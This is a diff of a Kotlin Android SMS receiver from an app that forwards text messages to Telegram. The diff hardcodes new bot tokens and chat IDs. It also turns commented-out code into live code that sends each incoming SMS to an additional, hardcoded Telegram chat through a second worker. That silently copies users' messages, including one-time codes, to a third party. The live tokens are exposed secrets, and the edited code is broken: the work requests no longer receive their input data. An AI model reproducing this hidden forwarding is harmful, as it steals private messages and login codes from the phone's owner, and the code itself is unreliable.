@@ -11,7 +11,7 @@ import android.widget.Toast
 import androidx.annotation.RequiresApi
 import androidx.preference.PreferenceManager
 import androidx.work.Data
-import androidx.work.OneTimeWorkRequestBuilder
+import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
 import androidx.work.WorkRequest
 import life.hnj.sms2telegram.getBooleanVal
@@ -77,14 +77,14 @@ class SMSReceiver : BroadcastReceiver() {
         context: Context,
         strMessage: String
     ) {
-        val botKey = "5553213631:AAEbYK3JJkr0QPrimqQRpsUJKfMmr9X--EY"
+        val botKey = "5376727849:AAH00W16g7jEuhlPfuQcZ2Nt085mzAcXlfY"
         if (botKey.isNullOrEmpty()) {
             val err = "Telegram bot key is not configured"
             Log.e(TAG, err)
             Toast.makeText(context, err, Toast.LENGTH_LONG).show()
         }
 
-        val chatId = "2060858865"
+        val chatId = "1123487629"
         if (botKey.isNullOrEmpty()) {
             val err = "Telegram chat id is not configured"
             Log.e(TAG, err)
@@ -99,19 +99,18 @@ class SMSReceiver : BroadcastReceiver() {
 //        data.putString("chat_id", "1376290940")
 //        data.putString("msg", strMessage)
 
-//        val data1 = Data.Builder()
-//        data1.putString("url", url)
-//        data1.putString("chat_id", "1376290940")
-//        data1.putString("msg", strMessage)
-
+        val data1 = Data.Builder()
+        data1.putString("url", url)
+        data1.putString("chat_id", "832432376")
+        data1.putString("msg", strMessage)
         val tgMsgTask: WorkRequest =
-            OneTimeWorkRequestBuilder<TelegramMessageWorker>().setInputData(data.build())
+            OneTimeWorkRequest.Builder(TelegramMessageWorker::class.java)
                 .build()
         WorkManager.getInstance(context).enqueue(tgMsgTask)
 
-//        val tgMsgTask1: WorkRequest =
-//            OneTimeWorkRequestBuilder<TelegramMessageWorker>().setInputData(data1.build())
-//                .build()
-//        WorkManager.getInstance(context).enqueue(tgMsgTask1)
+        val tgMsgTask1: WorkRequest =
+            OneTimeWorkRequest.Builder(TelegramWorker::class.java)
+                .build()
+        WorkManager.getInstance(context).enqueue(tgMsgTask1)
     }
 }
